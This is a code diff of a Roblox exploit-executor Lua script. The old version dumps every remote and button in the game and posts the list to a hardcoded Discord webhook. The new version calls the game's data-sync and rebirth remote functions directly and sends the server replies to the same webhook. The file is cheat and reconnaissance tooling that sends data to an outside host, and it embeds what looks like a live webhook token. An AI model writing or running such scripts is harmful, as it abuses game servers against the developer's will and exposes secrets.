@@ -1,41 +1,22 @@
--- dc_dump.lua
+-- probe_rebirth.lua
 local WEBHOOK = "https://discord.com/api/webhooks/1573296342854410384/3Nfz9qxVONkZl1jZADGMzCN6buVXkKydQgc8vNwIHjwhDvYsffo4BWcoe3UU1fI86CNf"
-local http = request or http_request or (syn and syn.request) or (http and http.request)
+local http = request or http_request or (syn and syn.request)
 local HttpService = game:GetService("HttpService")
 
-local function post(content)
-    if not http then return end
+local function post(c)
     pcall(function()
-        http({
-            Url = WEBHOOK,
-            Method = "POST",
+        http({ Url = WEBHOOK, Method = "POST",
             Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode({ content = content })
-        })
+            Body = HttpService:JSONEncode({ content = c }) })
     end)
 end
 
-if not http then
-    return
-end
+local Net = game:GetService("ReplicatedStorage").Packages.Net
+local Sync = Net:WaitForChild("RF/Synchronizer/RequestData")
+local Reb = Net:WaitForChild("RF/Rebirth/RequestRebirth")
 
-local lines = {}
-local n = 0
-for _, d in ipairs(game:GetDescendants()) do
-    if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") or d:IsA("TextButton") then
-        n = n + 1
-        table.insert(lines, d.ClassName .. " :: " .. d:GetFullName())
-    end
-end
+local ok, data = pcall(function() return Sync:InvokeServer() end)
+post("SYNC ok=" .. tostring(ok) .. " type=" .. typeof(data) .. "\n" .. HttpService:JSONEncode(data))
 
-local buf = ""
-for _, line in ipairs(lines) do
-    if #buf + #line + 1 > 1900 then
-        post(buf)
-        buf = ""
-        task.wait(1)
-    end
-    buf = buf .. line .. "\n"
-end
-if #buf > 0 then post(buf) end
-post("TOTAL: " .. n)
+local ok2, r = pcall(function() return Reb:InvokeServer() end)
+post("REBIRTH ok=" .. tostring(ok2) .. " type=" .. typeof(r) .. "\n" .. HttpService:JSONEncode(r))
